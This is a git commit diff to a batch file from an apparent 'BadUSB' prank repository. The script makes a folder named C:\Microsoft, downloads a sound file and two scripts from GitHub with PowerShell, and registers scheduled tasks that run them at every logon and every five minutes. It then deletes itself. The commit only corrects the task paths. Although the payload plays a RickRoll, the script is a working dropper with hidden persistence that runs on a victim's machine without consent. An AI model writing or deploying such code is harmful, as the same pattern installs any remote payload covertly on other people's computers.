ece8a5002dd9380f490f004a3a5a362ba92ed8d6
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-01-23 00:18:05 +0800

    Update Start.bat

--- BadUSBScripts/RickRoll/TaskSchedularRickRoll/Start.bat
+++ BadUSBScripts/RickRoll/TaskSchedularRickRoll/Start.bat
@@ -5,8 +5,8 @@ cd C:\
 mkdir Microsoft
 cd Microsoft
 Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/RickRoll.wav -OutFile .\RickRoll.wav;Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Sound.bat -OutFile .\Sound.bat;Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Sound.ps1 -OutFile .\Sound.ps1
-Schtasks /create /sc ONLOGON /tn L /tr "C:Microsoft\Sound.bat" 
-Schtasks /create /sc DAILY /tn LOL /tr "C:Microsoft\Sound.bat" /ri 5 /du 24:00
+Schtasks /create /sc ONLOGON /tn L /tr "C:\Microsoft\Sound.bat" 
+Schtasks /create /sc DAILY /tn LOL /tr "C:\Microsoft\Sound.bat" /ri 5 /du 24:00
 cd /D "%~dp0"
 del Start.bat
 exit
